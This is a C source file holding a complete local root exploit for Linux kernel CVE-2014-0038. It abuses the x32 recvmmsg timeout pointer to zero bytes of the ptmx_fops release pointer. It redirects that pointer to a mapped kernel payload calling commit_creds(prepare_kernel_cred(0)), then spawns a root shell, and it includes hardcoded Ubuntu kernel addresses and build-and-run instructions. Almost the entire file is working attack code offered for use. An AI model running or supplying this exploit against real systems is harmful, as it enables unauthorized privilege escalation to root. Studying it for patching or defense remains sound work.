/*
 * Local root exploit for CVE-2014-0038.
 *
 * https://raw.github.com/saelo/cve-2014-0038/master/timeoutpwn.c
 *
 * Bug: The X86_X32 recvmmsg syscall does not properly sanitize the timeout pointer
 * passed from userspace.
 *
 * Exploit primitive: Pass a pointer to a kernel address as timeout for recvmmsg,
 * if the original byte at that address is known it can be overwritten
 * with known data.
 * If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.
 *
 * Restrictions: The first long at the passed address (tv_sec) has to be positive
 * and the second long (tv_nsec) has to be smaller than 1000000000.
 *
 * Overview: Target the release function pointer of the ptmx_fops structure located in
 * non initialized (and thus writable) kernel memory. Zero out the three most
 * significant bytes and thus turn it into a pointer to an address mappable in
 * user space.
 * The release pointer is used as it is followed by 16 0x00 bytes (so the tv_nsec
 * is valid).
 * Open /dev/ptmx, close it and enjoy.
 *
 * Not very beautiful but should be fairly reliable if symbols can be resolved.
 *
 * Tested on Ubuntu 13.10
 *
 * gcc timeoutpwn.c -o pwn && ./pwn
 *
 * Written by saelo
 */
#define _GNU_SOURCE
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)

#define BUFSIZE 200
#define PAYLOADSIZE 0x2000
#define FOPS_RELEASE_OFFSET 13*8

/*
 * Adapt these addresses for your need.
 * see /boot/System.map* or /proc/kallsyms
 * These are the offsets from ubuntu 3.11.0-12-generic.
 */
#define PTMX_FOPS           0xffffffff81fb30c0LL
#define TTY_RELEASE         0xffffffff8142fec0LL
#define COMMIT_CREDS        0xffffffff8108ad40LL
#define PREPARE_KERNEL_CRED 0xffffffff8108b010LL

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

/*
 * Match signature of int release(struct inode*, struct file*).
 *
 * See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz
 */
int __attribute__((regparm(3)))
kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;    // restore pointer
    commit_creds(prepare_kernel_cred(0));

    return -1;
}

/*
 * Write a zero to the byte at then given address.
 * Only works if the current value is 0xff.
 */
void zero_out(long addr)
{
    int sockfd, retval, port, pid, i;
    struct sockaddr_in sa;
    char buf[BUFSIZE];
    struct mmsghdr msgs;
    struct iovec iovecs;

    srand(time(NULL));

    port = 1024 + (rand() % (0x10000 - 1024));

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = htons(port);
    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }

    memset(&msgs, 0, sizeof(msgs));
    iovecs.iov_base         = buf;
    iovecs.iov_len          = BUFSIZE;
    msgs.msg_hdr.msg_iov    = &iovecs;
    msgs.msg_hdr.msg_iovlen = 1;

    /*
     * start a seperate process to send a udp message after 255 seconds so the syscall returns,
     * but not after updating the timout struct and writing the remaining time into it.
     * 0xff - 255 seconds = 0x00
     */
    printf("clearing byte at 0x%lx\n", addr);
    pid = fork();
    if (pid == 0) {
        memset(buf, 0x41, BUFSIZE);

        if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
            perror("socket()");
            exit(EXIT_FAILURE);
        }

        sa.sin_family      = AF_INET;
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        sa.sin_port        = htons(port);

        printf("waiting 255 seconds...\n");
        for (i = 0; i < 255; i++) {
        if (i % 10 == 0)
                printf("%is/255s\n", i);
        sleep(1);
        }

        printf("waking up parent...\n");
        sendto(sockfd, buf, BUFSIZE, 0, &sa, sizeof(sa));
        exit(EXIT_SUCCESS);
    } else if (pid > 0) {
        retval = syscall(__NR_recvmmsg, sockfd, &msgs, 1, 0, (void*)addr);
        if (retval == -1) {
            printf("address can't be written to, not a valid timespec struct\n");
            exit(EXIT_FAILURE);
        }
        waitpid(pid, 0, 0);
        printf("byte zeroed out\n");
    } else {
      perror("fork()");
      exit(EXIT_FAILURE);
    }
}

int main(int argc, char** argv)
{
    long code, target;
    int pwn;

    /* Prepare payload... */
    printf("preparing payload buffer...\n");
    code = (long)mmap((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
    memset((void*)code, 0x90, PAYLOADSIZE);
    code += PAYLOADSIZE - 1024;
    memcpy((void*)code, &kernel_payload, 1024);

    /*
     * Now clear the three most significant bytes of the fops pointer
     * to the release function.
     * This will make it point into the memory region mapped above.
     */
    printf("changing kernel pointer to point into controlled buffer...\n");
    target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
    zero_out(target + 7);
    zero_out(target + 6);
    zero_out(target + 5);

    /* ... and trigger. */
    printf("releasing file descriptor to call manipulated pointer in kernel mode...\n");
    pwn = open("/dev/ptmx", 'r');
    close(pwn);

    if (getuid() != 0) {
        printf("failed to get root :(\n");
        exit(EXIT_FAILURE);
    }

    printf("got root, enjoy :)\n");
    return execl("/bin/bash", "-sh", NULL);
}